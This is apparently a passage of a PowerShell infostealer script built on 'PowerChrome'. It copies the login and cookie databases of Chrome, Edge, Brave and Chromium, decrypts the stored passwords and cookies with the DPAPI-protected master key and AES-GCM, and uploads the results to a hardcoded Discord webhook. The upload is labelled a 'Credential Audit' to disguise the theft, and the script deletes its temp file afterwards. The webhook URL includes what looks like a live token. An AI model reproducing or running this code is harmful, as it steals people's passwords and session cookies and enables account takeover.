        $OriginUrl  = if ($OriginUrlPointer -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($OriginUrlPointer) } else { "" }
        $Username   = if ($UsernamePointer  -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($UsernamePointer)  } else { "" }
        $Url = if ($ActionUrl) { $ActionUrl } else { $OriginUrl }
        if (-not $Url) { continue }

        $RawPasswordData = @()
        if ($PasswordSize -gt 0 -and $PasswordPointer -ne [IntPtr]::Zero) {
            $RawPasswordData = New-Object byte[] $PasswordSize
            [Runtime.InteropServices.Marshal]::Copy($PasswordPointer, $RawPasswordData, 0, $PasswordSize)
        }

        if ($RawPasswordData.Length -eq 0) { continue }

        $Header3 = [Text.Encoding]::ASCII.GetString($RawPasswordData, 0, [Math]::Min(3, $RawPasswordData.Length))
        $Header5 = [Text.Encoding]::ASCII.GetString($RawPasswordData, 0, [Math]::Min(5, $RawPasswordData.Length))

        $BlobHeaderType =
        if      ($Header5 -eq "DPAPI")  { "DPAPI (legacy)" }
        elseif  ($Header3 -eq "v10")    { "v10 (DPAPI user)" }
        elseif  ($Header3 -eq "v20")    { "v20 (ABE)" }
        else    { "Unknown" }

        $LoginResults += [PSCustomObject]@{
            Browser                 = $Browser
            URL                     = $Url
            Username                = $Username
            BlobHeader              = $BlobHeaderType
            Base64EncryptedPassword = [Convert]::ToBase64String($RawPasswordData)
        }
    }

    if ($StatementPointer -ne [IntPtr]::Zero) {
        [void]$Sqlite3Finalize.Invoke($StatementPointer)
        $StatementPointer = [IntPtr]::Zero
    }
    if ($DatabasePointer -ne [IntPtr]::Zero) {
        [void]$Sqlite3Close.Invoke($DatabasePointer)
        $DatabasePointer = [IntPtr]::Zero
    }

    # Give the OS/GC a moment to release any lingering handles
    Start-Sleep -Milliseconds 1000
    [GC]::Collect()
    [GC]::WaitForPendingFinalizers()
    Remove-Item -Path $TempDatabasePath -Force

    return $LoginResults
}

# ======================================================================
# Get-ChromiumCookieBlobs
# ======================================================================

function Get-ChromiumCookieBlobs {
    param([string]$Browser)

    switch ($Browser.ToLower()) {
        "cft"       { $BaseDir = Join-Path $env:LOCALAPPDATA "Google\Chrome for Testing\User Data\Default" }
        "chrome"    { $BaseDir = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Default" }
        "edge"      { $BaseDir = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data\Default" }
        "brave"     { $BaseDir = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data\Default" }
        "chromium"  { $BaseDir = Join-Path $env:LOCALAPPDATA "Chromium\User Data\Default" }
        default     { return $false }
    }

    $CookiePath = (Join-Path $BaseDir "Network\Cookies")
    if (-not (Test-Path $CookiePath)) { $CookiePath = (Join-Path $BaseDir "Cookies") }
    if (-not (Test-Path $CookiePath)) { return $false }

    [int]$SqliteOk = 0
    [int]$SqliteRow = 100
    [int]$SqliteOpenReadOnly = 1
    $TempDatabasePath = Join-Path $env:TEMP ("$($Browser)_Cookies_{0}.db" -f ([guid]::NewGuid()))

    try {
        $InStream = [System.IO.File]::Open($CookiePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        $OutStream = [System.IO.File]::Open($TempDatabasePath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
        $InStream.CopyTo($OutStream)
        $OutStream.Close()
        $InStream.Close()
    } catch { return $false }

    $DatabasePointer = [IntPtr]::Zero
    $StatementPointer = [IntPtr]::Zero
    $CookieSqlQuery = 'SELECT host_key, name, path, encrypted_value FROM cookies'

    $null = $Sqlite3OpenV2.Invoke($TempDatabasePath, [ref]$DatabasePointer, $SqliteOpenReadOnly, [IntPtr]::Zero)
    $null = $Sqlite3PrepareV2.Invoke($DatabasePointer, $CookieSqlQuery, -1, [ref]$StatementPointer, [IntPtr]::Zero)

    $CookieResults = @()
    while ($Sqlite3Step.Invoke($StatementPointer) -eq $SqliteRow) {
        $HostPtr      = $Sqlite3ColumnText.Invoke($StatementPointer, 0)
        $NamePtr      = $Sqlite3ColumnText.Invoke($StatementPointer, 1)
        $PathPtr      = $Sqlite3ColumnText.Invoke($StatementPointer, 2)
        $EncryptedPtr = $Sqlite3ColumnBlob.Invoke($StatementPointer, 3)
        $EncSize      = $Sqlite3ColumnByte.Invoke($StatementPointer, 3)

        if ($EncSize -gt 0) {
            $RawData = New-Object byte[] $EncSize
            [Runtime.InteropServices.Marshal]::Copy($EncryptedPtr, $RawData, 0, $EncSize)
            
            $CookieResults += [PSCustomObject]@{
                Host                 = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($HostPtr)
                Name                 = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)
                Path                 = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($PathPtr)
                BlobHeader           = "v10 (DPAPI user)" # THIS IS THE KEY FIX
                Base64EncryptedValue = [Convert]::ToBase64String($RawData)
            }
        }
    }
    [void]$Sqlite3Finalize.Invoke($StatementPointer)
    [void]$Sqlite3Close.Invoke($DatabasePointer)
    Remove-Item $TempDatabasePath -Force -ErrorAction SilentlyContinue
    return $CookieResults
}
# ======================================================================
# Invoke-PowerChrome (Main Function)
# ======================================================================

function Invoke-PowerChrome {
    param (
        [string]$Browser,
        [switch]$Verbose,
        [switch]$HideBanner
    )


    if (-not ($HideBanner)){
    Write-Output @"
    ____                          ________                            
   / __ \______      _____  _____/ ____/ /_  _________  ____ ___  ___ 
  / /_/ / __ \ | /| / / _ \/ ___/ /   / __ \/ ___/ __ \/ __ ```__ \/ _ \
 / ____/ /_/ / |/ |/ /  __/ /  / /___/ / / / /  / /_/ / / / / / /  __/
/_/    \____/|__/|__/\___/_/   \____/_/ /_/_/   \____/_/ /_/ /_/\___/ 

Github: https://github.com/The-Viper-One/

"@

}


if (-not ($Browser)){
    return "`n`n[*] The Parameter -Browser was not provided. The following Browsers are supported: `n`n - Chrome `n - Chromium `n - Edge`n`n"
}

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------
    function Log {
        param([string]$Message)
        if ($Verbose) { Write-Output "[*] $Message" }
    }

    function LogHex {
        param([string]$Label, [byte[]]$Bytes)
        if ($Verbose) {
            $Hex = if ($Bytes) { [BitConverter]::ToString($Bytes) } else { "<null>" }
            Write-Output "$Label : $Hex"
        }
    }

    # ------------------------------------------------------------------
    # SESSION INFORMATION
    # ------------------------------------------------------------------
    
    
    Write-Output "`n[*] $(if ($Browser -eq "Chrome"){"Google Chrome"} elseif ($Browser -eq "edge"){"Microsoft Edge"} elseif ($Browser -eq "chromium"){"Chromium"} else {$Browser})"
    Log "Current User Context : $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)"
    Log "Current User SID     : $([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value)"

    $LocalStatePath = $null
    $LoginDataPath  = $null


    # ------------------------------------------------------------------
    # COLLECT DATA
    # ------------------------------------------------------------------
   # ------------------------------------------------------------------
    # 1. COLLECT BOTH LOGINS AND COOKIES
    # ------------------------------------------------------------------
    Log "Running Collection..."
    $BrowserData = Get-ChromiumLoginBlobs -Browser $Browser
    $CookieBlobs = Get-ChromiumCookieBlobs -Browser $Browser # This must be called!

    if (-not $BrowserData -and -not $CookieBlobs) {
        Write-Output "[-] No data found for $($Browser.ToUpper())"
        return
    }

    # ------------------------------------------------------------------
    # 2. LOCAL STATE RESOLUTION (Keep your existing switch)
    # ------------------------------------------------------------------
    switch ($Browser.ToLower()) {
        "cft"       { $LocalStatePath = "$env:LOCALAPPDATA\Google\Chrome for Testing\User Data\Local State" }
        "chrome"    { $LocalStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" }
        "edge"      { $LocalStatePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" }
        "brave"     { $LocalStatePath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State" }
        "chromium"  { $LocalStatePath = "$env:LOCALAPPDATA\Chromium\User Data\Local State" }
        default     { return }
    }

    # ------------------------------------------------------------------
    # 3. DECRYPT THE MASTER KEY (Once, for both)
    # ------------------------------------------------------------------
    $MasterKey = $null
    # We check the first available blob to see if it's v10
    $CheckBlob = if ($BrowserData) { $BrowserData[0] } else { $CookieBlobs[0] }
    
    if ($CheckBlob.BlobHeader -eq 'v10 (DPAPI user)') {
        try {
            $LocalState = Get-Content $LocalStatePath -Raw | ConvertFrom-Json
            $EncKey = [Convert]::FromBase64String($LocalState.os_crypt.encrypted_key)[5..-1]
            $MasterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($EncKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        } catch { Write-Output "[-] Key Decryption Failed"; return }
    }

# ------------------------------------------------------------------
    # 4. DECRYPT EVERYTHING 
    # ------------------------------------------------------------------
    $DecryptedLogins = @()
    foreach ($Entry in $BrowserData) {
        try {
            $RawData = [Convert]::FromBase64String($Entry.Base64EncryptedPassword)
            $Nonce = $RawData[3..14]
            $Ciphertext = $RawData[15..($RawData.Length - 17)]
            $Tag = $RawData[($RawData.Length - 16)..($RawData.Length - 1)]
            
            # Using the correct function name: DecryptWithAesGcm
            $PassBytes = DecryptWithAesGcm -Key $MasterKey -Iv $Nonce -Ciphertext $Ciphertext -Tag $Tag
            $Pass = [Text.Encoding]::UTF8.GetString($PassBytes)
            $DecryptedLogins += [PSCustomObject]@{ URL = $Entry.URL; User = $Entry.Username; Pass = $Pass }
        } catch { 
            $DecryptedLogins += [PSCustomObject]@{ URL = $Entry.URL; User = $Entry.Username; Pass = "(Decryption Failed)" }
        }
    }

    $DecryptedCookies = @()
    foreach ($C in $CookieBlobs) {
        try {
            $RawData = [Convert]::FromBase64String($C.Base64EncryptedValue)
            $Nonce = $RawData[3..14]
            $Ciphertext = $RawData[15..($RawData.Length - 17)]
            $Tag = $RawData[($RawData.Length - 16)..($RawData.Length - 1)]
            
            # Using the correct function name: DecryptWithAesGcm
            $ValBytes = DecryptWithAesGcm -Key $MasterKey -Iv $Nonce -Ciphertext $Ciphertext -Tag $Tag
            $Val = [Text.Encoding]::UTF8.GetString($ValBytes)
            $DecryptedCookies += [PSCustomObject]@{ Host = $C.Host; Name = $C.Name; Value = $Val }
        } catch {
            $DecryptedCookies += [PSCustomObject]@{ Host = $C.Host; Name = $C.Name; Value = "(Decryption Failed)" }
        }
    }
    # ------------------------------------------------------------------
    # 5. RETURN THE HASHTABLE (What the Discord logic expects)
    # ------------------------------------------------------------------
    return @{
        Logins  = $DecryptedLogins
        Cookies = $DecryptedCookies
    }
}
# 1. Trigger the function with a valid browser name (Chrome, Edge, or Chromium)
$Output = Invoke-PowerChrome -Browser Chrome -HideBanner

# Filter for the hashtable we explicitly returned, ignoring pipeline string output pollution
$Secrets = $Output | Where-Object { $_ -is [hashtable] } | Select-Object -Last 1

# 2. Check if we found any data
if ($Secrets -and ($Secrets.Logins.Count -gt 0 -or $Secrets.Cookies.Count -gt 0)) {
    # Convert the object results to a readable string
    $OutputString = New-Object System.Text.StringBuilder
    
    if ($Secrets.Logins.Count -gt 0) {
        [void]$OutputString.AppendLine("========================================")
        [void]$OutputString.AppendLine("LOGIN CREDENTIALS")
        [void]$OutputString.AppendLine("========================================")
        [void]$OutputString.AppendLine(($Secrets.Logins | Format-Table -AutoSize | Out-String))
    }

    if ($Secrets.Cookies.Count -gt 0) {
        [void]$OutputString.AppendLine("`n========================================")
        [void]$OutputString.AppendLine("BROWSER COOKIES")
        [void]$OutputString.AppendLine("========================================")
        [void]$OutputString.AppendLine(($Secrets.Cookies | Format-Table -AutoSize | Out-String))
    }

    $CleanOutput = $OutputString.ToString()
    
    # 3. Create a temporary file to hold the results
    $HostName = $env:COMPUTERNAME
    $UserName = $env:USERNAME

    $TempFile = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "Results_$($HostName).txt")
    $CleanOutput | Set-Content -Path $TempFile -Encoding UTF8

    # 4. Define the Webhook and Payload
    $WebhookUrl = "https://discord.com/api/webhooks/1493893030439157881/QCtnE2iZqh52ccW3JRiWno55pzKqV3rR20SeETHwNLwLyLiVI7Cn28rZKGU2lZz_0Eep"
    
    $Payload = @{
        username = "CSIT-Audit-Bot"
        content  = "### 🛡️ Credential Audit Results from **$HostName**`n**User:** $UserName`nSee attached file for full details."
    }
    $JsonBody = $Payload | ConvertTo-Json -Compress
    
    # 5. Send to Discord as a file attachment
    try {
        if ($PSVersionTable.PSVersion.Major -ge 6) {
            # PowerShell 6.0+ (Core) supports the -Form parameter for multipart/form-data
            $FormContent = @{
                payload_json = $JsonBody
                file         = Get-Item -Path $TempFile
            }
            Invoke-RestMethod -Uri $WebhookUrl -Method Post -Form $FormContent
        }
        else {
            # Windows PowerShell 5.1 workaround using .NET HttpClient
            Add-Type -AssemblyName System.Net.Http
            $HttpClient = New-Object System.Net.Http.HttpClient
            $MultipartContent = New-Object System.Net.Http.MultipartFormDataContent
            
            # Add JSON payload
            $JsonContent = New-Object System.Net.Http.StringContent($JsonBody)
            $MultipartContent.Add($JsonContent, "payload_json")
            
            # Add File attachment
            $FileBytes = [System.IO.File]::ReadAllBytes($TempFile)
            $FileContent = New-Object System.Net.Http.ByteArrayContent($FileBytes, 0, $FileBytes.Length)
            $FileName = [System.IO.Path]::GetFileName($TempFile)
            $MultipartContent.Add($FileContent, "file", $FileName)
            
            # Execute request
            $Response = $HttpClient.PostAsync($WebhookUrl, $MultipartContent).Result
            $Response.EnsureSuccessStatusCode() | Out-Null
            $HttpClient.Dispose()
        }
        Write-Host "Success: Check your Discord!" -ForegroundColor Green
    }
    catch {
        Write-Host "Discord Error: $($_.Exception.Message)" -ForegroundColor Red
    }
    finally {
        # 6. Cleanup temporary file
        if (Test-Path $TempFile) { Remove-Item -Path $TempFile -Force }
    }
}
else {
    Write-Host "No passwords were found on this machine." -ForegroundColor Yellow
}

